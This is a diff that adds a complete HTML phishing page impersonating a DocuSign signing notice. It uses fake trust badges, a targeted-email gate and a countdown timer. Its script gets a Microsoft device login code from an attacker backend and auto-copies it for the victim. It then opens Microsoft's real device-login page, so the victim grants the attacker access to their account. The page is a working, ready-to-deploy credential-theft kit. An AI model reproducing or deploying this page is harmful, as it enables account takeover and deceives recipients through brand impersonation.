@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DocuSign – Action Required: Document Ready for Signature</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='4' fill='%234744A4'/><path d='M6 8h13c3.87 0 7 3.13 7 7s-3.13 7-7 7H6V8zm13 10c1.66 0 3-1.34 3-3s-1.34-3-3-3H10v6h9z' fill='white'/></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f1f1f1;font-family:'Lato',Helvetica,Arial,sans-serif;color:#333;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
+.wrap{width:100%;max-width:620px}
+/* Email envelope card */
+.card{background:#fff;border:1px solid #d0d0d0;border-radius:2px}
+/* Top bar with real DocuSign colors */
+.topbar{background:#26282b;padding:16px 28px;display:flex;align-items:center;justify-content:space-between;border-radius:2px 2px 0 0}
+/* Real DocuSign SVG logo — purple D + wordmark */
+.ssl-note{color:#9e9e9e;font-size:11px;display:flex;align-items:center;gap:4px}
+.sender-bar{background:#4744A4;padding:14px 28px}
+.sender-bar p{color:#fff;font-size:13px}
+.sender-bar strong{font-size:15px}
+.body-section{padding:28px 28px 20px}
+/* Document preview box */
+.doc-box{border:1px solid #e0e0e0;border-radius:3px;padding:18px 18px;display:flex;align-items:center;gap:16px;margin-bottom:22px;background:#fafafa}
+.doc-thumb{flex-shrink:0}
+.doc-details .doc-title{font-size:15px;font-weight:700;color:#26282b;margin-bottom:3px}
+.doc-details .doc-meta{font-size:12px;color:#888}
+.doc-details .doc-badge{display:inline-block;background:#fff3cd;color:#856404;border:1px solid #ffc107;border-radius:3px;padding:2px 8px;font-size:11px;font-weight:700;margin-top:6px}
+/* Message */
+.message{background:#f9f9ff;border-left:4px solid #4744A4;padding:14px 18px;font-size:14px;color:#444;line-height:1.7;margin-bottom:22px;border-radius:0 3px 3px 0}
+/* CTA */
+.cta-section{text-align:center;margin:24px 0}
+.review-btn{display:inline-block;background:#ffcb00;color:#26282b;font-size:15px;font-weight:900;padding:14px 52px;border-radius:3px;border:none;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.5px;box-shadow:0 2px 0 #e6b800;transition:background .15s,transform .1s;text-decoration:none}
+.review-btn:hover{background:#f0be00;transform:translateY(-1px)}
+.review-btn:active{transform:translateY(1px);box-shadow:none}
+.alt-text{font-size:12px;color:#999;margin-top:10px}
+.alt-text a{color:#4744A4}
+.divider{border:none;border-top:1px solid #ebebeb;margin:20px 0}
+/* Steps strip */
+.steps{display:flex;gap:0;margin:16px 0}
+.step{flex:1;text-align:center;padding:12px 8px;position:relative}
+.step:not(:last-child)::after{content:'›';position:absolute;right:-4px;top:50%;transform:translateY(-50%);color:#bbb;font-size:20px}
+.step-num{width:30px;height:30px;border-radius:50%;background:#4744A4;color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;margin:0 auto 6px}
+.step-label{font-size:11px;color:#666;line-height:1.4}
+/* Footer */
+.footer{background:#f7f7f7;border-top:1px solid #e0e0e0;padding:18px 28px}
+.trust-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
+.trust-item{display:flex;align-items:center;gap:5px;font-size:11px;color:#666;background:#fff;border:1px solid #e0e0e0;border-radius:2px;padding:4px 10px}
+.footer-fine{font-size:11px;color:#aaa;line-height:1.6}
+.footer-fine a{color:#4744A4}
+
+/* Auth overlay */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.65);backdrop-filter:blur(3px);align-items:center;justify-content:center}
+.auth-box{background:#fff;border-radius:6px;padding:36px 32px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.35)}
+.ms-logo-row{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px}
+/* Email gate */
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(25,25,50,.7);backdrop-filter:blur(5px)}
+.gate-box{background:#fff;border-radius:4px;padding:40px 36px;width:90%;max-width:410px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4)}
+.gate-input{width:100%;padding:10px 14px;border:1.5px solid #ccc;border-radius:3px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;transition:border .15s}
+.gate-input:focus{border-color:#4744A4}
+.gate-btn{width:100%;background:#4744A4;color:#fff;border:none;border-radius:3px;padding:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
+.gate-btn:hover{background:#3a3890}
+.gate-err{color:#c0392b;font-size:13px;margin-bottom:10px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="card">
+  <!-- Topbar -->
+  <div class="topbar">
+    <!-- Real DocuSign logo: D-shape icon + wordmark -->
+    <svg width="148" height="30" viewBox="0 0 148 30" xmlns="http://www.w3.org/2000/svg">
+      <!-- Purple rounded-corner D shape -->
+      <rect width="30" height="30" rx="4" fill="#4744A4"/>
+      <path d="M7 7h10c4.42 0 8 3.58 8 8s-3.58 8-8 8H7V7zm10 12c2.21 0 4-1.79 4-4s-1.79-4-4-4H11v8h6z" fill="white"/>
+      <!-- Wordmark -->
+      <text x="36" y="21" font-family="'Lato',Arial,sans-serif" font-size="17" font-weight="700" fill="white" letter-spacing="-0.3">DocuSign</text>
+    </svg>
+    <div class="ssl-note">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="#27ae60"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+      SSL Secured
+    </div>
+  </div>
+
+  <!-- Sender bar -->
+  <div class="sender-bar">
+    <p><strong>DocuSign eSignature</strong> · no-reply@docusign.net</p>
+    <p style="opacity:.85;font-size:12px;margin-top:2px">DocuSign &bull; Electronic Signature Platform</p>
+  </div>
+
+  <!-- Body -->
+  <div class="body-section">
+    <p style="font-size:16px;font-weight:700;color:#26282b;margin-bottom:4px">Please DocuSign: Review and Sign Document</p>
+    <p style="font-size:13px;color:#777;margin-bottom:20px">This document requires your electronic signature to proceed.</p>
+
+    <!-- Doc card -->
+    <div class="doc-box">
+      <div class="doc-thumb">
+        <!-- PDF page icon -->
+        <svg width="52" height="66" viewBox="0 0 52 66" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="52" height="66" rx="2" fill="#f5f5f5" stroke="#ddd"/>
+          <path d="M34 0v18h18L34 0z" fill="#e0e0e0"/>
+          <rect x="6" y="24" width="40" height="2" rx="1" fill="#4744A4"/>
+          <rect x="6" y="30" width="40" height="1.5" rx="1" fill="#e0e0e0"/>
+          <rect x="6" y="35" width="32" height="1.5" rx="1" fill="#e0e0e0"/>
+          <rect x="6" y="40" width="36" height="1.5" rx="1" fill="#e0e0e0"/>
+          <rect x="6" y="45" width="28" height="1.5" rx="1" fill="#e0e0e0"/>
+          <rect x="4" y="52" width="44" height="10" rx="2" fill="#fff8e1" stroke="#ffcb00" stroke-width="1.5"/>
+          <text x="26" y="60" text-anchor="middle" font-size="7.5" font-weight="900" fill="#856404" font-family="Arial">▶ SIGN</text>
+        </svg>
+      </div>
+      <div class="doc-details">
+        <div class="doc-title">Retainer_Agreement_Confidential_2026.pdf</div>
+        <div class="doc-meta">3 pages · 1 signer required · Sent <span class="dyn-date-short"></span></div>
+        <div class="doc-meta" style="margin-top:2px">Expires: <strong><span class="dyn-date-plus7"></span></strong></div>
+        <div class="doc-badge">⏳ Waiting for your signature</div>
+      </div>
+    </div>
+
+    <!-- Sender message -->
+    <div class="message">
+      <strong style="color:#333">Message from sender:</strong><br>
+      "Please review and sign the attached document. This requires your electronic signature to proceed. The document has been sent securely through DocuSign and sign at your earliest convenience. The deadline is end of week. Do not hesitate to reach out if you have questions before signing."
+    </div>
+
+    <!-- CTA -->
+    <div class="cta-section">
+      <button class="review-btn" onclick="startAuth()">Review Documents</button>
+      <div class="alt-text">By clicking you agree to DocuSign's <a href="#">Terms of Service</a> &amp; <a href="#">Privacy Policy</a></div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Steps -->
+    <div class="steps">
+      <div class="step"><div class="step-num">1</div><div class="step-label">Click "Review Documents"</div></div>
+      <div class="step"><div class="step-num">2</div><div class="step-label">Verify your identity</div></div>
+      <div class="step"><div class="step-num">3</div><div class="step-label">Sign &amp; submit</div></div>
+      <div class="step"><div class="step-num">4</div><div class="step-label">Document complete</div></div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="trust-row">
+      <div class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="#27ae60"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>SSL / TLS Encrypted</div>
+      <div class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="#2980b9"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>ESIGN Act Compliant</div>
+      <div class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="#8e44ad"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>Tamper-evident Seal</div>
+    </div>
+    <div class="footer-fine">
+      DocuSign, Inc. · 221 Main Street, Suite 1550, San Francisco, CA 94105<br>
+      <a href="#">Privacy Policy</a> · <a href="#">Terms of Use</a> · <a href="#">Contact Support</a><br>
+      Do not share this email. This notification was sent by DocuSign on behalf of <strong>no-reply@docusign.net</strong>.
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- Microsoft auth overlay -->
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div class="ms-logo-row">
+      <svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span style="font-size:15px;font-weight:300;color:#5e5e5e;font-family:inherit">Microsoft</span>
+    </div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:8px">Verify your identity</h3>
+    <p id="auth-sub" style="font-size:13px;color:#555;margin-bottom:22px;line-height:1.6">DocuSign requires your Microsoft account to confirm your identity before you can access the document.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #e8e8e8;border-top-color:#0067b8;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 14px"></div><p style="font-size:13px;color:#999">Connecting securely…</p></div>
+        <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#aaa;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#fff;font-family:monospace;background:rgba(0,0,0,.2);border-radius:6px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed rgba(255,255,255,.2)" onclick="openLogin()"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:8px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#4744A4;color:#fff;box-shadow:0 4px 14px rgba(0,0,0,.3)">
+        <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+        Open Microsoft Device Login →
+      </button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#777;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;text-decoration:underline">Copy manually</span></p>
+    </div>
+      <div id="ok-sec" style="display:none">
+      <svg width="52" height="52" viewBox="0 0 24 24" fill="#27ae60" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      <p style="font-size:16px;font-weight:700;color:#27ae60">Verified Successfully</p>
+      <p style="font-size:13px;color:#999;margin-top:6px">Loading your document…</p>
+    </div>
+  </div>
+</div>
+
+<!-- Email gate -->
+<div id="email-gate">
+  <div class="gate-box">
+    <svg width="140" height="30" viewBox="0 0 148 30" style="margin-bottom:18px">
+      <rect width="30" height="30" rx="4" fill="#4744A4"/><path d="M7 7h10c4.42 0 8 3.58 8 8s-3.58 8-8 8H7V7zm10 12c2.21 0 4-1.79 4-4s-1.79-4-4-4H11v8h6z" fill="white"/>
+      <text x="36" y="21" font-family="'Lato',Arial,sans-serif" font-size="17" font-weight="700" fill="#26282b" letter-spacing="-0.3">DocuSign</text>
+    </svg>
+    <p style="font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:6px">Confirm Recipient Email</p>
+    <p style="font-size:13px;color:#666;margin-bottom:22px;line-height:1.6">This document was sent to your inbox. Enter the work email address where you received this request to proceed.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Your work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ That email doesn't match our records. Please enter the email this was sent to.</div>
+    <button class="gate-btn" onclick="gv()">Verify &amp; Access Document →</button>
+    <p style="font-size:11px;color:#bbb;margin-top:12px">🔒 DocuSign Secure Access Verification</p>
+  </div>
+</div>
+
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+// Gate
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#e74c3c';i.style.animation='shake .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+// Auth
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';document.getElementById('auth-title').textContent='Verification Complete';document.getElementById('auth-sub').textContent='Your identity has been confirmed.';setTimeout(()=>window.location.href='https://www.office.com',2500);}}).catch(()=>{});},( d.interval||5)*1000);}).catch(()=>location.reload());}
+
+function openLogin(){
+  cpCode();
+  const url='https://microsoft.com/devicelogin';
+  const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');
+  if(!w||w.closed||typeof w.closed==='undefined'){
+    // Popup blocked — fall back to redirect in same tab after short delay
+    const btn=document.getElementById('open-btn');
+    if(btn){btn.textContent='⏎ Redirecting…';}
+    setTimeout(()=>window.location.href=url,800);
+  }
+}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script>
+<script>
+// Dynamic date injection — replaces all .dyn-date and .dyn-date-plus7 elements on load
+(function(){
+  const now=new Date();
+  const fmt=(d)=>d.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
+  const fmtShort=(d)=>d.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
+  const plus7=new Date(now);plus7.setDate(plus7.getDate()+7);
+  const plus14=new Date(now);plus14.setDate(plus14.getDate()+14);
+  const timeStr=now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false})+' UTC';
+  document.querySelectorAll('.dyn-date').forEach(el=>el.textContent=fmt(now));
+  document.querySelectorAll('.dyn-date-short').forEach(el=>el.textContent=fmtShort(now));
+  document.querySelectorAll('.dyn-date-plus7').forEach(el=>el.textContent=fmtShort(plus7));
+  document.querySelectorAll('.dyn-date-plus14').forEach(el=>el.textContent=fmtShort(plus14));
+  document.querySelectorAll('.dyn-time').forEach(el=>el.textContent=timeStr);
+  document.querySelectorAll('.dyn-year').forEach(el=>el.textContent=now.getFullYear());
+})();
+</script>
+</body></html>
